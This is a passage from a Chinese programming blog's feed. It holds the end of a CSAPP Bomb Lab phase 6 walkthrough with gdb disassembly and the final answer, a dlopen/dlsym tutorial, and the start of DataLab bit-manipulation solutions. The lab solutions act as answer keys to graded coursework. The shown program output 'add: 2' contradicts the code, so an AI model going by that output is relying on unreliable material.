llvm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="number">0x0000000000401153</span> &lt;+<span class="number">95</span>&gt;:lea    <span class="number">0x18</span>(<span class="symbol">%rsp</span>),<span class="symbol">%rsi</span></div><div class="line"><span class="number">0x0000000000401158</span> &lt;+<span class="number">100</span>&gt;:mov    <span class="symbol">%r14</span>,<span class="symbol">%rax</span></div><div class="line"><span class="number">0x000000000040115b</span> &lt;+<span class="number">103</span>&gt;:mov    $<span class="number">0x7</span>,<span class="symbol">%ecx</span></div><div class="line"><span class="number">0x0000000000401160</span> &lt;+<span class="number">108</span>&gt;:mov    <span class="symbol">%ecx</span>,<span class="symbol">%edx</span></div><div class="line"><span class="number">0x0000000000401162</span> &lt;+<span class="number">110</span>&gt;:<span class="keyword">sub</span>    (<span class="symbol">%rax</span>),<span class="symbol">%edx</span></div><div class="line"><span class="number">0x0000000000401164</span> &lt;+<span class="number">112</span>&gt;:mov    <span class="symbol">%edx</span>,(<span class="symbol">%rax</span>)</div><div class="line"><span class="number">0x0000000000401166</span> &lt;+<span class="number">114</span>&gt;:<span class="keyword">add</span>    $<span class="number">0x4</span>,<span class="symbol">%rax</span></div><div class="line"><span class="number">0x000000000040116a</span> &lt;+<span class="number">118</span>&gt;:cmp    <span class="symbol">%rsi</span>,<span class="symbol">%rax</span></div><div class="line"><span class="number">0x000000000040116d</span> &lt;+<span class="number">121</span>&gt;:jne    <span class="number">0x401160</span> &lt;phase_<span class="number">6</span>+<span class="number">108</span>&gt;</div></pre></td></tr></table></figure><p>然后根据1，2，3，4，5，6分别在栈中填上。0x6032d0, 0x6032e0, 0x6032f0, 0x603300, 0x603310, 0x603320</p><figure class="highlight pf"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="number">0</span>x000000000040116f <span class="variable">&lt;+123&gt;</span>:mov    <span class="variable">$0x0</span>,%esi</div><div class="line"><span class="number">0</span>x0000000000401174 <span class="variable">&lt;+128&gt;</span>:jmp    <span class="number">0</span>x401197 <span class="variable">&lt;phase_6+163&gt;</span></div><div class="line"><span class="number">0</span>x0000000000401176 <span class="variable">&lt;+130&gt;</span>:mov    <span class="number">0</span>x8(%rdx),%rdx</div><div class="line"><span class="number">0</span>x000000000040117a <span class="variable">&lt;+134&gt;</span>:add    <span class="variable">$0x1</span>,%eax</div><div class="line"><span class="number">0</span>x000000000040117d <span class="variable">&lt;+137&gt;</span>:cmp    %ecx,%eax</div><div class="line"><span class="number">0</span>x000000000040117f <span class="variable">&lt;+139&gt;</span>:jne    <span class="number">0</span>x401176 <span class="variable">&lt;phase_6+130&gt;</span></div><div class="line"><span class="number">0</span>x0000000000401181 <span class="variable">&lt;+141&gt;</span>:jmp    <span class="number">0</span>x401188 <span class="variable">&lt;phase_6+148&gt;</span></div><div class="line"><span class="number">0</span>x0000000000401183 <span class="variable">&lt;+143&gt;</span>:mov    <span class="variable">$0x6032d0</span>,%edx</div><div class="line"><span class="number">0</span>x0000000000401188 <span class="variable">&lt;+148&gt;</span>:mov    %rdx,<span class="number">0</span>x20(%rsp,%rsi,<span class="number">2</span>)</div><div class="line"><span class="number">0</span>x000000000040118d <span class="variable">&lt;+153&gt;</span>:add    <span class="variable">$0x4</span>,%rsi</div><div class="line"><span class="number">0</span>x0000000000401191 <span class="variable">&lt;+157&gt;</span>:cmp    <span class="variable">$0x18</span>,%rsi</div><div class="line"><span class="number">0</span>x0000000000401195 <span class="variable">&lt;+161&gt;</span>:je     <span class="number">0</span>x4011ab <span class="variable">&lt;phase_6+183&gt;</span></div><div class="line"><span class="number">0</span>x0000000000401197 <span class="variable">&lt;+163&gt;</span>:mov    (%rsp,%rsi,<span class="number">1</span>),%ecx</div><div class="line"><span class="number">0</span>x000000000040119a <span class="variable">&lt;+166&gt;</span>:cmp    <span class="variable">$0x1</span>,%ecx</div><div class="line"><span class="number">0</span>x000000000040119d <span class="variable">&lt;+169&gt;</span>:jle    <span class="number">0</span>x401183 <span class="variable">&lt;phase_6+143&gt;</span></div><div class="line"><span class="number">0</span>x000000000040119f <span class="variable">&lt;+171&gt;</span>:mov    <span class="variable">$0x1</span>,%eax</div><div class="line"><span class="number">0</span>x00000000004011a4 <span class="variable">&lt;+176&gt;</span>:mov    <span class="variable">$0x6032d0</span>,%edx</div><div class="line"><span class="number">0</span>x00000000004011a9 <span class="variable">&lt;+181&gt;</span>:jmp    <span class="number">0</span>x401176 <span class="variable">&lt;phase_6+130&gt;</span></div></pre></td></tr></table></figure><p>然后我们观察一下0x6032d0的内容,其实就是一个结构体，包括value，id，和next_node。</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">(gdb) x/<span class="number">24w</span>x <span class="number">0x6032d0</span></div><div class="line"><span class="number">0x6032d0</span> &lt;node1&gt;:<span class="number">0</span>x0000014c<span class="number">0x00000001</span><span class="number">0</span>x<span class="number">006032e0</span><span class="number">0x00000000</span></div><div class="line"><span class="number">0x6032e0</span> &lt;node2&gt;:<span class="number">0</span>x<span class="number">000000a8</span><span class="number">0x00000002</span><span class="number">0</span>x<span class="number">006032f0</span><span class="number">0x00000000</span></div><div class="line"><span class="number">0x6032f0</span> &lt;node3&gt;:<span class="number">0</span>x0000039c<span class="number">0x00000003</span><span class="number">0x00603300</span><span class="number">0x00000000</span></div><div class="line"><span class="number">0x603300</span> &lt;node4&gt;:<span class="number">0</span>x<span class="number">000002b3</span><span class="number">0x00000004</span><span class="number">0x00603310</span><span class="number">0x00000000</span></div><div class="line"><span class="number">0x603310</span> &lt;node5&gt;:<span class="number">0</span>x000001dd<span class="number">0x00000005</span><span class="number">0x00603320</span><span class="number">0x00000000</span></div><div class="line"><span class="number">0x603320</span> &lt;node6&gt;:<span class="number">0</span>x000001bb<span class="number">0x00000006</span><span class="number">0x00000000</span><span class="number">0x00000000</span></div></pre></td></tr></table></figure><p>之后把栈里的链表按照栈中的顺序重新排列，并且使得第一个数对应的结点val最大，依次递推，第6个数对应最小的结点。所以最后的输入为4 3 2 1 6 5</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">   <span class="number">0x00000000004011ab</span> &lt;+<span class="number">183</span>&gt;:<span class="keyword">mov</span>    <span class="number">0x20</span>(%rsp),%rbx</div><div class="line">   <span class="number">0x00000000004011b0</span> &lt;+<span class="number">188</span>&gt;:<span class="keyword">lea</span>    <span class="number">0x28</span>(%rsp),%rax</div><div class="line">   <span class="number">0x00000000004011b5</span> &lt;+<span class="number">193</span>&gt;:<span class="keyword">lea</span>    <span class="number">0x50</span>(%rsp),%rsi</div><div class="line">   <span class="number">0x00000000004011ba</span> &lt;+<span class="number">198</span>&gt;:<span class="keyword">mov</span>    %rbx,%rcx</div><div class="line">   <span class="number">0x00000000004011bd</span> &lt;+<span class="number">201</span>&gt;:<span class="keyword">mov</span>    (%rax),%rdx</div><div class="line">   <span class="number">0x00000000004011c0</span> &lt;+<span class="number">204</span>&gt;:<span class="keyword">mov</span>    %rdx,<span class="number">0x8</span>(%rcx)</div><div class="line">   <span class="number">0x00000000004011c4</span> &lt;+<span class="number">208</span>&gt;:<span class="keyword">add</span>    <span class="number">$0</span>x8,%rax</div><div class="line">   <span class="number">0x00000000004011c8</span> &lt;+<span class="number">212</span>&gt;:<span class="keyword">cmp</span>    %rsi,%rax</div><div class="line">   <span class="number">0x00000000004011cb</span> &lt;+<span class="number">215</span>&gt;:<span class="keyword">je</span>     <span class="number">0x4011d2</span> &lt;phase_6+<span class="number">222</span>&gt;</div><div class="line">   <span class="number">0x00000000004011cd</span> &lt;+<span class="number">217</span>&gt;:<span class="keyword">mov</span>    %rdx,%rcx</div><div class="line">   <span class="number">0x00000000004011d0</span> &lt;+<span class="number">220</span>&gt;:<span class="keyword">jmp</span>    <span class="number">0x4011bd</span> &lt;phase_6+<span class="number">201</span>&gt;</div><div class="line">   <span class="number">0x00000000004011d2</span> &lt;+<span class="number">222</span>&gt;:<span class="keyword">movq</span>   <span class="number">$0</span>x0,<span class="number">0x8</span>(%rdx)</div><div class="line">   <span class="number">0x00000000004011da</span> &lt;+<span class="number">230</span>&gt;:<span class="keyword">mov</span>    <span class="number">$0</span>x5,%ebp</div><div class="line">   <span class="number">0x00000000004011df</span> &lt;+<span class="number">235</span>&gt;:<span class="keyword">mov</span>    <span class="number">0x8</span>(%rbx),%rax</div><div class="line">   <span class="number">0x00000000004011e3</span> &lt;+<span class="number">239</span>&gt;:<span class="keyword">mov</span>    (%rax),%eax</div><div class="line">   <span class="number">0x00000000004011e5</span> &lt;+<span class="number">241</span>&gt;:<span class="keyword">cmp</span>    %eax,(%rbx)</div><div class="line">   <span class="number">0x00000000004011e7</span> &lt;+<span class="number">243</span>&gt;:<span class="keyword">jge</span>    <span class="number">0x4011ee</span> &lt;phase_6+<span class="number">250</span>&gt;</div><div class="line">   <span class="number">0x00000000004011e9</span> &lt;+<span class="number">245</span>&gt;:callq  <span class="number">0x40143a</span> &lt;explode_bomb&gt;</div><div class="line">   <span class="number">0x00000000004011ee</span> &lt;+<span class="number">250</span>&gt;:<span class="keyword">mov</span>    <span class="number">0x8</span>(%rbx),%rbx</div><div class="line">   <span class="number">0x00000000004011f2</span> &lt;+<span class="number">254</span>&gt;:<span class="keyword">sub</span>    <span class="number">$0</span>x1,%ebp</div><div class="line">   <span class="number">0x00000000004011f5</span> &lt;+<span class="number">257</span>&gt;:<span class="keyword">jne</span>    <span class="number">0x4011df</span> &lt;phase_6+<span class="number">235</span>&gt;</div><div class="line">   <span class="number">0x00000000004011f7</span> &lt;+<span class="number">259</span>&gt;:<span class="keyword">add</span>    <span class="number">$0</span>x50,%rsp</div><div class="line">   <span class="number">0x00000000004011fb</span> &lt;+<span class="number">263</span>&gt;:<span class="keyword">pop</span>    %rbx</div><div class="line">   <span class="number">0x00000000004011fc</span> &lt;+<span class="number">264</span>&gt;:<span class="keyword">pop</span>    %rbp</div><div class="line">   <span class="number">0x00000000004011fd</span> &lt;+<span class="number">265</span>&gt;:<span class="keyword">pop</span>    %r12</div><div class="line">   <span class="number">0x00000000004011ff</span> &lt;+<span class="number">267</span>&gt;:<span class="keyword">pop</span>    %r13</div><div class="line">   <span class="number">0x0000000000401201</span> &lt;+<span class="number">269</span>&gt;:<span class="keyword">pop</span>    %r14</div><div class="line">   <span class="number">0x0000000000401203</span> &lt;+<span class="number">271</span>&gt;:retq   </div><div class="line">End of assembler dump.</div></pre></td></tr></table></figure><p>整个Bomb Lab还是非常有意思的，而且通过bomb lab对汇编代码，以及gdb的使用理解更加深刻。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;实验内容&quot;&gt;&lt;a href=&quot;#实验内容&quot; class=&quot;headerlink&quot; title=&quot;实验内容&quot;&gt;&lt;/a&gt;实验内容&lt;/h1&gt;&lt;p&gt;给定一个x86-64下可运行的可执行文件bomb，和对应的主程序代码bomb.c。用户需要输入6个字符串，一步步解开炸弹。如
      
    
    </summary>
    
      <category term="深入理解计算机系统" scheme="http://yoursite.com/categories/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
    
      <category term="计算机基础" scheme="http://yoursite.com/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"/>
    
      <category term="GDB" scheme="http://yoursite.com/tags/GDB/"/>
    
      <category term="汇编" scheme="http://yoursite.com/tags/%E6%B1%87%E7%BC%96/"/>
    
  </entry>
  
  <entry>
    <title>利用dlopen，dlsym加载动态链接库</title>
    <link href="http://yoursite.com/2017/11/01/dlsym%E8%B0%83%E7%94%A8%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93/"/>
    <id>http://yoursite.com/2017/11/01/dlsym调用动态链接库/</id>
    <published>2017-11-01T14:00:00.000Z</published>
    <updated>2017-11-01T15:08:17.000Z</updated>
    
    <content type="html"><![CDATA[<p>最近碰到一个需求，程序加载的动态库中有若干个函数，如何根据函数签名从这些函数中返回唯一匹配的函数。</p><p>分析该问题，首先需要知道编译后的目标文件中，每个函数的函数签名是什么。其次，要如何根据函数签名从动态库中获得对应的函数。</p><h1 id="函数签名"><a href="#函数签名" class="headerlink" title="函数签名"></a>函数签名</h1><h2 id="C函数签名"><a href="#C函数签名" class="headerlink" title="C函数签名"></a>C函数签名</h2><p>C函数中，不能通过改变函数的参数列表实现重载，因为只使用函数名作为签名。</p><p>example：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span>  </span>&#123;</div><div class="line"><span class="keyword">return</span> (a + b);</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span> </span>&#123;</div><div class="line">    <span class="keyword">return</span> (a - b);</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">mul</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span> </span>&#123;</div><div class="line">    <span class="keyword">return</span> (a * b);</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">div</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span> </span>&#123;</div><div class="line">    <span class="keyword">return</span> (a / b);</div><div class="line">&#125;</div></pre></td></tr></table></figure><p><strong>将函数编译成动态链接库</strong></p><p>gcc -fPIC -shared calc.c -o libcalc.so</p><p>使用nm查看libcalc.so的函数列表, 可以看到四个对应的函数</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">nm libcalc.so </div><div class="line"><span class="number">0000000000000</span>eb0 <span class="built_in">T</span> _add</div><div class="line"><span class="number">0000000000000</span>ef5 <span class="built_in">T</span> _div</div><div class="line"><span class="number">0000000000000</span>ee2 <span class="built_in">T</span> _mul</div><div class="line"><span class="number">0000000000000</span>ed0 <span class="built_in">T</span> _sub</div></pre></td></tr></table></figure><h2 id="C-函数签名"><a href="#C-函数签名" class="headerlink" title="C++函数签名"></a>C++函数签名</h2><p>c++函数以函数名加参数类型作为签名，所以可以通过改变参数列表实现重载。</p><p>将上述文件保存为cpp之后，用g++编译成动态链接库，并查看函数列表</p><p>g++ -fPIC -shared calc.cpp -o libcalc.so</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="number">0000000000000</span>ebc <span class="built_in">T</span> __Z3addii</div><div class="line"><span class="number">0000000000000</span>ef5 <span class="built_in">T</span> __Z3divii</div><div class="line"><span class="number">0000000000000</span>ee2 <span class="built_in">T</span> __Z3mulii</div><div class="line"><span class="number">0000000000000</span>ed0 <span class="built_in">T</span> __Z3subii</div></pre></td></tr></table></figure><p>以加法函数为例，add为函数名，ii表示两个参数分别为int，int</p><p>如果重载add函数，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">(<span class="keyword">float</span> a, <span class="keyword">int</span> b)</span> </span>&#123;</div><div class="line"><span class="keyword">return</span> (a + b);</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>编译之后的函数签名如下，add的第一个参数为float,第二个为int</p><p>0000000000000eb0 T __Z3addfi</p><h3 id="将C-函数签名转换为C函数签名"><a href="#将C-函数签名转换为C函数签名" class="headerlink" title="将C++函数签名转换为C函数签名"></a>将C++函数签名转换为C函数签名</h3><p>在某些场景下，需要用c来调c++函数，就需要对c++函数做包装，使得函数名长得和C函数名一致。通过extern “C”来实现：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">extern</span> <span class="string">"C"</span> &#123;</div><div class="line">code</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>对应的code函数名就与C函数名一致</p><h1 id="加载动态库"><a href="#加载动态库" class="headerlink" title="加载动态库"></a>加载动态库</h1><p>知道了函数的签名，可以通过dlopen, dlsym在动态库中查找对应的函数。</p><ul><li><strong>dlopen</strong>：打开指定动态库， 返回handle句柄给调用进程<ul><li>打开方式有多种，比如<ul><li>RTLD_LAZY:    在dlopen返回前，对于动态库中未定义的符号不执行解析</li><li>RTLD_NOW:        需要在dlopen返回前，解析出所有未定义符号，否则返回错误</li></ul></li></ul></li><li><strong>dlerror</strong>：    返回出现的错误</li><li><strong>dlsym</strong>：    通过句柄和连接符名称获取函数，并返回该函数指针</li><li><strong>dlclose</strong>：    关闭打开的库</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dlfcn.h&gt;</span></span></div><div class="line"><span class="function"><span class="keyword">void</span> *<span class="title">dlopen</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *filename, <span class="keyword">int</span> mode)</span></span>;</div><div class="line"><span class="function"><span class="keyword">char</span> *<span class="title">dlerror</span><span class="params">(<span class="keyword">void</span>)</span></span>;</div><div class="line"><span class="function"><span class="keyword">void</span> *<span class="title">dlsym</span><span class="params">(<span class="keyword">void</span> *handle, <span class="keyword">const</span> <span class="keyword">char</span> *symbol)</span></span>;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">dlclose</span><span class="params">(<span class="keyword">void</span> *handle)</span></span>;</div></pre></td></tr></table></figure><p>采用上述生成的libcalc.so, 测试dlsym等函数功能</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dlfcn.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;functional&gt;</span></span></div><div class="line"></div><div class="line"><span class="comment">//动态链接库路径</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> LIB_CALCULATE_PATH <span class="meta-string">"./libcalc.so"</span></span></div><div class="line"></div><div class="line"><span class="comment">//函数指针</span></div><div class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">int</span> <span class="params">(*CAC_FUNC)</span><span class="params">(<span class="keyword">int</span>, <span class="keyword">int</span>)</span></span>;</div><div class="line"><span class="keyword">typedef</span> <span class="built_in">std</span>::function&lt;<span class="keyword">int</span>(<span class="keyword">int</span>, <span class="keyword">int</span>)&gt; FUNC;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</div><div class="line">    <span class="keyword">void</span> *handle;</div><div class="line">    <span class="keyword">char</span> *error;</div><div class="line">    FUNC func = <span class="literal">NULL</span>;</div><div class="line"></div><div class="line">    <span class="comment">//打开动态链接库</span></div><div class="line">    handle = dlopen(LIB_CALCULATE_PATH, RTLD_LAZY);</div><div class="line">    <span class="keyword">if</span> (!handle) &#123;</div><div class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"%s\n"</span>, dlerror());</div><div class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="comment">//清除之前存在的错误</span></div><div class="line">    dlerror();</div><div class="line"></div><div class="line">    <span class="comment">//获取一个函数</span></div><div class="line">    <span class="comment">// 将dlsym返回的 void* 转化为CAC_FUNC的函数指针，然后赋给func</span></div><div class="line">    func = (CAC_FUNC)(dlsym(handle, <span class="string">"add"</span>));</div><div class="line">    <span class="keyword">if</span> ((error = dlerror()) != <span class="literal">NULL</span>)  &#123;</div><div class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"%s\n"</span>, error);</div><div class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</div><div class="line">    &#125;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"add: %d\n"</span>, func(<span class="number">2</span>,<span class="number">7</span>));</div><div class="line"></div><div class="line">    func = (CAC_FUNC)(dlsym(handle, <span class="string">"sub"</span>));</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"sub: %d\n"</span>, func(<span class="number">9</span>,<span class="number">2</span>));</div><div class="line"></div><div class="line">    func = (CAC_FUNC)dlsym(handle, <span class="string">"mul"</span>);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"mul: %d\n"</span>, func(<span class="number">3</span>,<span class="number">2</span>));</div><div class="line"></div><div class="line">    func = (CAC_FUNC)dlsym(handle, <span class="string">"div"</span>);</div><div class="line">    <span class="comment">//*(void **) (&amp;cac_func) = dlsym(handle, "div");</span></div><div class="line">    <span class="built_in">printf</span>(<span class="string">"div: %d\n"</span>, func(<span class="number">8</span>,<span class="number">2</span>));</div><div class="line"></div><div class="line">    <span class="comment">//关闭动态链接库</span></div><div class="line">    dlclose(handle);</div><div class="line">    <span class="built_in">exit</span>(EXIT_SUCCESS);</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>最后编译，运行如下</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">➜  tools gi<span class="variable">t:</span>(master) ✗ g++ -rdynamic -<span class="keyword">o</span> main main.cpp -ldl</div><div class="line">➜  tools gi<span class="variable">t:</span>(master) ✗ ./main </div><div class="line"><span class="built_in">add</span>: <span class="number">2</span></div><div class="line">su<span class="variable">b:</span> <span class="number">7</span></div><div class="line">mu<span class="variable">l:</span> <span class="number">6</span></div><div class="line"><span class="keyword">di</span><span class="variable">v:</span> <span class="number">4</span></div></pre></td></tr></table></figure><p>利用上述的方案，能够方便的使用动态库中的函数，提高灵活性。</p><p><strong>参考资料</strong></p><p><a href="http://www.cnblogs.com/Anker/p/3746802.html" target="_blank" rel="external">http://www.cnblogs.com/Anker/p/3746802.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;最近碰到一个需求，程序加载的动态库中有若干个函数，如何根据函数签名从这些函数中返回唯一匹配的函数。&lt;/p&gt;
&lt;p&gt;分析该问题，首先需要知道编译后的目标文件中，每个函数的函数签名是什么。其次，要如何根据函数签名从动态库中获得对应的函数。&lt;/p&gt;
&lt;h1 id=&quot;函数签名&quot;&gt;&lt;
      
    
    </summary>
    
      <category term="Linux环境编程" scheme="http://yoursite.com/categories/Linux%E7%8E%AF%E5%A2%83%E7%BC%96%E7%A8%8B/"/>
    
    
      <category term="dlopen" scheme="http://yoursite.com/tags/dlopen/"/>
    
      <category term="dlsym" scheme="http://yoursite.com/tags/dlsym/"/>
    
      <category term="动态库" scheme="http://yoursite.com/tags/%E5%8A%A8%E6%80%81%E5%BA%93/"/>
    
      <category term="函数签名" scheme="http://yoursite.com/tags/%E5%87%BD%E6%95%B0%E7%AD%BE%E5%90%8D/"/>
    
  </entry>
  
  <entry>
    <title>CMU15213：CSAPP 实验一：DataLab</title>
    <link href="http://yoursite.com/2017/10/16/cmu15213-datalab/"/>
    <id>http://yoursite.com/2017/10/16/cmu15213-datalab/</id>
    <published>2017-10-16T14:33:00.000Z</published>
    <updated>2017-10-17T11:59:13.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="实验内容"><a href="#实验内容" class="headerlink" title="实验内容"></a>实验内容</h1><p>《深入理解计算机系统》的第一个实验，内容包括位操作，用二进制表示整数，浮点数，以及相应的操作。实验限定了可选用的操作符，并且有最大次数限制，总体来讲还是非常有趣的。</p><h2 id="bitAnd"><a href="#bitAnd" class="headerlink" title="bitAnd"></a>bitAnd</h2><p>只使用 ~ 和 | 实现 &amp;</p><p>De Morgan定律</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">/* </div><div class="line"> * <span class="built_in">bitAnd</span> - x&amp;y using only ~ <span class="built_in">and</span> | </div><div class="line"> *   Examp<span class="symbol">le:</span> <span class="built_in">bitAnd</span>(<span class="number">6</span>, <span class="number">5</span>) = <span class="number">4</span></div><div class="line"> *   Legal o<span class="symbol">ps:</span> ~ |</div><div class="line"> *   <span class="built_in">Max</span> o<span class="symbol">ps:</span> <span class="number">8</span></div><div class="line"> *   Rati<span class="symbol">ng:</span> <span class="number">1</span></div><div class="line"> */</div><div class="line"><span class="built_in">int</span> <span class="built_in">bitAnd</span>(<span class="built_in">int</span> x, <span class="built_in">int</span> y) &#123;</div><div class="line">  return ~(~x | ~y);</div><div class="line">&#125;</div></pre></td></tr></table></figure><h2 id="getByte"><a href="#getByte" class="headerlink" title="getByte"></a>getByte</h2><p>从一个整数（4字节）中提取第0，1，2，3个字节。每个字节8bits，所以通过右移8*n位，然后取最后8位bits</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">/* </div><div class="line"> * getByte - Extract byte <span class="built_in">n</span> from word x</div><div class="line"> *   Bytes numbered from <span class="number">0</span> (LSB) to <span class="number">3</span> (MSB)</div><div class="line"> *   Exampl<span class="symbol">es:</span> getByte(<span class="number">0</span>x12345678,<span class="number">1</span>) = <span class="number">0</span>x56</div><div class="line"> *   Legal o<span class="symbol">ps:</span> ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</div><div class="line"> *   <span class="built_in">Max</span> o<span class="symbol">ps:</span> <span class="number">6</span></div><div class="line"> *   Rati<span class="symbol">ng:</span> <span class="number">2</span></div><div class="line"> */</div><div class="line"><span class="built_in">int</span> getByte(<span class="built_in">int</span> x, <span class="built_in">int</span> <span class="built_in">n</span>) &#123;</div><div class="line">  return x&gt;&gt;(<span class="built_in">n</span>&lt;&lt;<span class="number">3</span>) &amp; <span class="number">0</span>xFF;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h2 id="logicalShift"><a href="#logicalShift" class="headerlink" title="logicalShift"></a>logicalShift</h2><p>将一个数逻辑右移，当x为负数时，代码实际上进行的是算术右移，所以要将右移的1改为0</p><p>最高位右移之后的位置为：32-n，所以将-1[1..1]左移动31-n位，得到[1..10..0]。取反之后再&amp;算术右移的数即可。</p><p>但由于不能使用-，使用-n=~n+1. 32-n= 32+~n+1。并且使得每次移位的范围在[0,31]之间，分成两次移位。</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><div 